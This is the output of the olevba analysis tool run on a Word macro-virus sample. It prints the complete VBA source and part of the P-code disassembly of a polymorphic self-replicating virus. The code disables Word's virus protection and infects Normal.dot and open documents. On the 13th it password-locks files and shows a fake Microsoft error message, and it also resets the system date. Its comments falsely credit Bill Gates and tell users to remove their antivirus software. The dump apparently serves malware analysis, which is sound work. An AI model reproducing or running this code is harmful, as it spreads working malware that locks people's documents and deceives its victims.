olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Backhand
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Backhand - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Thank you for using my new cool Macro! It was created by the same
'author as the W97M/Giveme Macro. But this is much better, so if you
'liked my previous Macro, I'm sure you gonna like this one too!
'
'Author: Bill Gates (he he, if you don't believe me, just send an
'e-mail to askbill@microsoft.com).
'
'Some stupid anti-virus scanners may detect this Macro as a virus!
'But this is NOT a virus! It's just a Macro that modifies documents
'to make them better! If you have a stupid AV scanner that detects
'this useful Macro, then your scanner is a Trojan Horse that tries
'to remove useful code! You should immediately uninstall and stop
'using it. Microsoft don't like people who create trojan horses that
'destroys useful code!

Sub AutoOpen()
Dim Hey(1 To 8) As String
On Error Resume Next

With Application
    .EnableCancelKey = wdCancelDisabled
    With Options
        .VirusProtection = 7 - 7
        .SaveNormalPrompt = 6 - 6
        .ConfirmConversions = 4 - 4
        .SavePropertiesPrompt = 8 - 8
    End With
    .DisplayAlerts = wdAlertsNone
End With

WordBasic.DisableAutoMacros 0

Set Doc1 = ActiveDocument
Set Doc2 = Doc1.VBProject
Set Doc3 = Doc2.VBComponents
Set Doc4 = Doc3.Item(6 - 5)
Set Doc5 = Doc4.CodeModule

Set Dot1 = NormalTemplate
Set Dot2 = Dot1.VBProject
Set Dot3 = Dot2.VBComponents
Set Dot4 = Dot3.Item(5 - 4)
Set Dot5 = Dot4.CodeModule

Doc = Doc5.CountOfLines
Dot = Dot5.CountOfLines

SetAttr "c:\sysboot.bin", vbNormal

If Dot = 0 Then
    If Not GetAttr(NormalTemplate.FullName) = vbNormal And _
    Not GetAttr(NormalTemplate.FullName) = vbArchive + vbNormal Then
        SetAttr NormalTemplate.FullName, vbNormal
        If Dir(NormalTemplate.FullName) = "" Then Application.Quit Savechanges:=wdSaveChanges
        Application.Quit Savechanges:=wdDoNotSaveChanges
    End If
    
    Set host1 = NormalTemplate
    Set host2 = host1.VBProject
    Set host3 = host2.VBComponents
    Set host4 = host3.Item(7 - 6)
    Set host5 = host4.CodeModule
    
    Open "c:\sysboot.bin" For Output As #1
    
    For i = 1 To Doc
        If i = 16 Then
            Print #1, "Sub AutoClose()"
        ElseIf i = 161 Then
            Print #1, "Sub ViewVBCode()"
        ElseIf i = 165 Then
            Print #1, "Sub ToolsMacro()"
        ElseIf i = 169 Then
            Print #1, "Sub FileSaveAs()"
        ElseIf i = 188 Then
            Print #1, "Function Poly()"
        ElseIf i <= 229 Then
            Print #1, Doc5.Lines(i, 1)
        End If
    Next i

    Close #1
End If

If Doc = 0 Then
    If Not GetAttr(ActiveDocument.FullName) = vbNormal And _
    Not GetAttr(ActiveDocument.FullName) = vbArchive + vbNormal Then Exit Sub
    
    If Not ActiveDocument.SaveFormat = wdFormatDocument And _
    Not ActiveDocument.SaveFormat = wdFormatTemplate Then Exit Sub

    If Mid(ActiveDocument.Name, 1, 2) = "Do" And _
    Mid(ActiveDocument.Name, 4, 5) = "ument" Then Exit Sub
    
    Set host1 = ActiveDocument
    Set host2 = host1.VBProject
    Set host3 = host2.VBComponents
    Set host4 = host3.Item(9 - 8)
    Set host5 = host4.CodeModule

    x = 0
    
    For i = 1 To 8
        Randomize
        Hey(i) = Int(Rnd * 9) + 1
    Next i

    Open "c:\sysboot.bin" For Output As #1

    For i = 1 To Dot
        If i = 16 Then
            Print #1, "Sub AutoOpen()"
        ElseIf i = 23 Or i = 24 Or i = 25 Or i = 26 Then
            x = x + 1
            Print #1, Left(Dot5.Lines(i, 1), Len(Dot5.Lines(i, 1)) - 5) & Hey(x) & " - " & Hey(x)
        ElseIf i = 36 Or i = 42 Or i = 61 Or i = 98 Then
            x = x + 1
            Print #1, Left(Dot5.Lines(i, 1), Len(Dot5.Lines(i, 1)) - 7) & "(" & Hey(x) & " - " & Hey(x) - 1 & ")"
        ElseIf i = 161 Then
            Print #1, "Sub " & Poly & "()"
        ElseIf i = 165 Then
            Print #1, "Sub " & Poly & "()"
        ElseIf i = 169 Then
            Print #1, "Sub " & Poly & "()"
        ElseIf i = 188 Then
            Print #1, "Function " & Poly & "()"
        ElseIf i <= 229 Then
            Print #1, Dot5.Lines(i, 1)
        End If
    Next i
    
    Close #1
End If

If Dot > 0 And Doc > 0 Then GoTo NiceDay

host5.AddFromFile ("c:\sysboot.bin")

NiceDay:
If Day(Now) = 13 And Dot <> 0 And Doc = 0 Then
    For i = 1 To 10
        Randomize
        One = Int(Rnd * 9) + 1
        Two = Two & One
    Next i

    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate, Password:=Trim(Two)
    
    If WeekDay(Now) = vbFriday Then
        MsgBox "It's Friday 13th! This is my lucky day, I hope it's yours too!", vbInformation, "Have A Nice Day!"
    Else
        MsgBox "Your document has been corrupted because of a bug in Word! Call Microsoft Customer Support, they can help you. When you call, tell them this Bug-ID Code (don't forget it!): " & Trim(Two), vbCritical, "Microsoft Word"
    End If
ElseIf Dot <> 0 And Doc = 0 Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
End If

If Year(Now) >= 2000 Then Date = #1/1/80#
End Sub

Sub fIfYKzOwIK()
'Have A Nice Day!
End Sub

Sub ghBhxVZdzT()
'Have A Nice Day!
End Sub

Sub PAMlNOymiM()
On Error Resume Next

If ActiveDocument.SaveFormat = wdFormatTemplate Then
    PreviousName = ActiveDocument.FullName
    ActiveDocument.Content.Copy
    ActiveDocument.Close
    
    Application.Documents.Add.Content.Paste
    ActiveDocument.Characters.Last.Copy
    ActiveDocument.Characters.Last.Delete
    ActiveDocument.SaveAs FileName:=PreviousName, FileFormat:=wdFormatDocument

    Application.ScreenRefresh
End If

Dialogs(wdDialogFileSaveAs).Show
End Sub

Function NIBbtGZcaR()

For i = 1 To 10
    Randomize
    Hmm = Int(Rnd * 26) + 1
    
    If Hmm = 1 Then HmmHmm = "Q"
    If Hmm = 2 Then HmmHmm = "W"
    If Hmm = 3 Then HmmHmm = "E"
    If Hmm = 4 Then HmmHmm = "R"
    If Hmm = 5 Then HmmHmm = "T"
    If Hmm = 6 Then HmmHmm = "Y"
    If Hmm = 7 Then HmmHmm = "U"
    If Hmm = 8 Then HmmHmm = "I"
    If Hmm = 9 Then HmmHmm = "O"
    If Hmm = 10 Then HmmHmm = "P"
    If Hmm = 11 Then HmmHmm = "A"
    If Hmm = 12 Then HmmHmm = "S"
    If Hmm = 13 Then HmmHmm = "D"
    If Hmm = 14 Then HmmHmm = "F"
    If Hmm = 15 Then HmmHmm = "G"
    If Hmm = 16 Then HmmHmm = "H"
    If Hmm = 17 Then HmmHmm = "J"
    If Hmm = 18 Then HmmHmm = "K"
    If Hmm = 19 Then HmmHmm = "L"
    If Hmm = 20 Then HmmHmm = "Z"
    If Hmm = 21 Then HmmHmm = "X"
    If Hmm = 22 Then HmmHmm = "C"
    If Hmm = 23 Then HmmHmm = "V"
    If Hmm = 24 Then HmmHmm = "B"
    If Hmm = 25 Then HmmHmm = "N"
    If Hmm = 26 Then HmmHmm = "M"
    
    Randomize
    HmmHmmHmm = Int(Rnd * 2)
    If HmmHmmHmm = 1 Then HmmHmm = LCase(HmmHmm)
    
    HmmHmmHmmHmm = HmmHmmHmmHmm & HmmHmm
Next i

Poly = HmmHmmHmmHmm
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Backhand
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12536 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0041 "Thank you for using my new cool Macro! It was created by the same"
' Line #1:
' 	QuoteRem 0x0000 0x0043 "author as the W97M/Giveme Macro. But this is much better, so if you"
' Line #2:
' 	QuoteRem 0x0000 0x003E "liked my previous Macro, I'm sure you gonna like this one too!"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0040 "Author: Bill Gates (he he, if you don't believe me, just send an"
' Line #5:
' 	QuoteRem 0x0000 0x0021 "e-mail to askbill@microsoft.com)."
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x0041 "Some stupid anti-virus scanners may detect this Macro as a virus!"
' Line #8:
' 	QuoteRem 0x0000 0x0042 "But this is NOT a virus! It's just a Macro that modifies documents"
' Line #9:
' 	QuoteRem 0x0000 0x0041 "to make them better! If you have a stupid AV scanner that detects"
' Line #10:
' 	QuoteRem 0x0000 0x0041 "this useful Macro, then your scanner is a Trojan Horse that tries"
' Line #11:
' 	QuoteRem 0x0000 0x0040 "to remove useful code! You should immediately uninstall and stop"
' Line #12:
' 	QuoteRem 0x0000 0x0043 "using it. Microsoft don't like people who create trojan horses that"
' Line #13:
' 	QuoteRem 0x0000 0x0015 "destroys useful code!"
' Line #14:
' Line #15:
' 	FuncDefn (Sub AutoOpen())
' Line #16:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	VarDefn Hey (As String)
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' Line #19:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #20:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #21:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #22:
' 	LitDI2 0x0007 
' 	LitDI2 0x0007 
' 	Sub 
' 	MemStWith VirusProtection 
' Line #23:
' 	LitDI2 0x0006 
' 	LitDI2 0x0006 
' 	Sub 
' 	MemStWith SaveNormalPrompt 
' Line #24:
' 	LitDI2 0x0004 
' 	LitDI2 0x0004 
' 	Sub 
' 	MemStWith ConfirmConversions 
' Line #25:
' 	LitDI2 0x0008 
' 	LitDI2 0x0008 
' 	Sub 
' 	MemStWith SavePropertiesPrompt 
' Line #26:
' 	EndWith 
' Line #27:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #28:
' 	EndWith 
' Line #29:
' Line #30:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #31:
' Line #32:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc1 
' Line #33:
' 	SetStmt 
' 	Ld Doc1 
' 	MemLd VBProject 
' 	Set Doc2 
' Line #34:
' 	SetStmt 
' 	Ld Doc2 
' 	MemLd VBComponents 
' 	Set Doc3 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0006 
' 	LitDI2 0x0005 
' 	Sub 
' 	Ld Doc3 
' 	ArgsMemLd Item 0x0001 
' 	Set Doc4 
' Line #36:
' 	SetStmt 
' 	Ld Doc4 
' 	MemLd CodeModule 
' 	Set Doc5 
' Line #37:
' Line #38:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Dot1 
' Line #39:
' 	SetStmt 
' 	Ld Dot1 
' 	MemLd VBProject 
' 	Set Dot2 
' Line #40:
' 	SetStmt 
' 	Ld Dot2 
' 	MemLd VBComponents 
' 	Set Dot3 
' Line #41:
' 	SetStmt 
' 	LitDI2 0x0005 
' 	LitDI2 0x0004 
' 	Sub 
' 	Ld Dot3 
' 	ArgsMemLd Item 0x0001 
' 	Set Dot4 
' Line #42:
' 	SetStmt 
' 	Ld Dot4 
' 	MemLd CodeModule 
' 	Set Dot5 
' Line #43:
' Line #44:
' 	Ld Doc5 
' 	MemLd CountOfLines 
' 	St Doc 
' Line #45:
' 	Ld Dot5 
' 	MemLd CountOfLines 
' 	St Dot 
' Line #46:
' Line #47:
' 	LitStr 0x000E "c:\sysboot.bin"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #48:
' Line #49:
' 	Ld Dot 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LineCont 0x0004 0B 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbNormal 
' 	Eq 
' 	Not 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbNormal 
' 	Add 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #52:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdSaveChanges 
' 	ParamNamed Savechanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' 	EndIf 
' Line #53:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed Savechanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set host1 
' Line #57:
' 	SetStmt 
' 	Ld host1 
' 	MemLd VBProject 
' 	Set host2 
' Line #58:
' 	SetStmt 
' 	Ld host2 
' 	MemLd VBComponents 
' 	Set host3 
' Line #59:
' 	SetStmt 
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	Sub 
' 	Ld host3 
' 	ArgsMemLd Item 0x0001 
' 	Set host4 
' Line #60:
' 	SetStmt 
' 	Ld host4 
' 	MemLd CodeModule 
' 	Set host5 
' Line #61:
' Line #62:
' 	LitStr 0x000E "c:\sysboot.bin"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	For 
' Line #65:
' 	Ld i 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub AutoClose()"
' 	PrintItemNL 
' Line #67:
' 	Ld i 
' 	LitDI2 0x00A1 
' 	Eq 
' 	ElseIfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	PrintItemNL 
' Line #69:
' 	Ld i 
' 	LitDI2 0x00A5 
' 	Eq 
' 	ElseIfBlock 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	PrintItemNL 
' Line #71:
' 	Ld i 
' 	LitDI2 0x00A9 
' 	Eq 
' 	ElseIfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	PrintItemNL 
' Line #73:
' 	Ld i 
' 	LitDI2 0x00BC 
' 	Eq 
' 	ElseIfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Function Poly()"
' 	PrintItemNL 
' Line #75:
' 	Ld i 
' 	LitDI2 0x00E5 
' 	Le 
' 	ElseIfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Doc5 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	EndIfBlock 
' Line #82:
' Line #83:
' 	Ld Doc 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LineCont 0x0004 0B 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbNormal 
' 	Eq 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbNormal 
' 	Add 
' 	Eq 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #85:
' Line #86:
' 	LineCont 0x0004 08 00 04 00
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #87:
' Line #88:
' 	LineCont 0x0004 0E 00 04 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "Do"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0005 "ument"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #89:
' Line #90:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set host1 
' Line #91:
' 	SetStmt 
' 	Ld host1 
' 	MemLd VBProject 
' 	Set host2 
' Line #92:
' 	SetStmt 
' 	Ld host2 
' 	MemLd VBComponents 
' 	Set host3 
' Line #93:
' 	SetStmt 
' 	LitDI2 0x0009 
' 	LitDI2 0x0008 
' 	Sub 
' 	Ld host3 
' 	ArgsMemLd Item 0x0001 
' 	Set host4 
' Line #94:
' 	SetStmt 
' 	Ld host4 
' 	MemLd CodeModule 
' 	Set host5 
' Line #95:
' Line #96:
' 	LitDI2 0x0000 
' 	St x 
' Line #97:
' Line #98:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #99:
' 	ArgsCall Read 0x0000 
' Line #100:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsSt Hey 0x0001 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' Line #103:
' 	LitStr 0x000E "c:\sysboot.bin"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #104:
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Dot 
' 	For 
' Line #106:
' 	Ld i 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	PrintItemNL 
' Line #108:
' 	Ld i 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld i 
' 	LitDI2 0x0018 
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x0019 
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Eq 
' 	Or 
' 	ElseIfBlock 
' Line #109:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Dot5 
' 	ArgsMemLd Lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Dot5 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0005 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld x 
' 	ArgsLd Hey 0x0001 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld x 
' 	ArgsLd Hey 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #111:
' 	Ld i 
' 	LitDI2 0x0024 
' 	Eq 
' 	Ld i 
' 	LitDI2 0x002A 
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x003D 
' 	Eq 
' 	Or 
' 	Ld i 
' 	LitDI2 0x0062 
' 	Eq 
' 	Or 
' 	ElseIfBlock 
' Line #112:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Dot5 
' 	ArgsMemLd Lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Dot5 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld x 
' 	ArgsLd Hey 0x0001 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld x 
' 	ArgsLd Hey 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #114:
' 	Ld i 
' 	LitDI2 0x00A1 
' 	Eq 
' 	ElseIfBlock 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld Poly 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #116:
' 	Ld i 
' 	LitDI2 0x00A5 
' 	Eq 
' 	ElseIfBlock 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld Poly 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #118:
' 	Ld i 
' 	LitDI2 0x00A9 
' 	Eq 
' 	ElseIfBlock 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld Poly 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #120:
' 	Ld i 
' 	LitDI2 0x00BC 
' 	Eq 
' 	ElseIfBlock 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Function "
' 	Ld Poly 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #122:
' 	Ld i 
' 	LitDI2 0x00E5 
' 	Le 
' 	ElseIfBlock 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Dot5 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #128:
' 	EndIfBlock 
' Line #129:
' Line #130:
' 	Ld Dot 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld Doc 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NiceDay 
' 	EndIf 
' Line #131:
' Line #132:
' 	LitStr 0x000E "c:\sysboot.bin"
' 	Paren 
' 	Ld host5 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #133:
' Line #134:
' 	Label NiceDay 
' Line #135:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Ld Dot 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Ld Doc 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #136:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #137:
' 	ArgsCall Read 0x0000 
' Line #138:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St One 
' Line #139:
' 	Ld Two 
' 	Ld One 
' 	Concat 
' 	St Two 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' Line #142:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld Two 
' 	ArgsLd Trim 0x0001 
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #143:
' Line #144:
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	IfBlock 
' Line #145:
' 	LitStr 0x003E "It's Friday 13th! This is my lucky day, I hope it's yours too!"
' 	Ld vbInformation 
' 	LitStr 0x0010 "Have A Nice Day!"
' 	ArgsCall MsgBox 0x0003 
' Line #146:
' 	ElseBlock 
' Line #147:
' 	LitStr 0x00AD "Your document has been corrupted because of a bug in Word! Call Microsoft Customer Support, they can help you. When you call, tell them this Bug-ID Code (don't forget it!): "
' 	Ld Two 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld Dot 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Doc 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDate 0x0000 0x0000 0x8940 0x40DC 
' 	St Date 
' 	EndIf 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Sub fIfYKzOwIK())
' Line #157:
' 	QuoteRem 0x0000 0x0010 "Have A Nice Day!"
' Line #158:
' 	EndSub 
' Line #159:
' Line #160:
' 	FuncDefn (Sub ghBhxVZdzT())
' Line #161:
' 	QuoteRem 0x0000 0x0010 "Have A Nice Day!"
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub PAMlNOymiM())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' Line #167:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	IfBlock 
' Line #168:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St PreviousName 
' Line #169:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall Copy 0x0000 
' Line #170:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #171:
' Line #172:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Add 
' 	MemLd Content 
' 	ArgsMemCall Paste 0x0000 
' Line #173:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Last 
' 	ArgsMemCall Copy 0x0000 
' Line #174:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Last 
' 	ArgsMemCall Delete 0x0000 
' Line #175:
' 	Ld PreviousName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #176:
' Line #177:
' 	Ld Application 
' 	ArgsMemCall ScreenRefresh 0x0000 
' Line #178:
' 	EndIfBlock 
' Line #179:
' Line #180:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' 	FuncDefn (Function NIBbtGZcaR(id_FFFE As Variant))
' Line #184:
' Line #185:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #186:
' 	ArgsCall Read 0x0000 
' Line #187:
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Hmm 
' Line #188:
' Line #189:
' 	Ld Hmm 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St HmmHmm 
' 	EndIf 
' Line #190:
' 	Ld Hmm 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St HmmHmm 
' 	EndIf 
' Line #191:
' 	Ld Hmm 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St HmmHmm 
' 	EndIf 
' Line #192:
' 	Ld Hmm 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St HmmHmm 
' 	EndIf 
' Line #193:
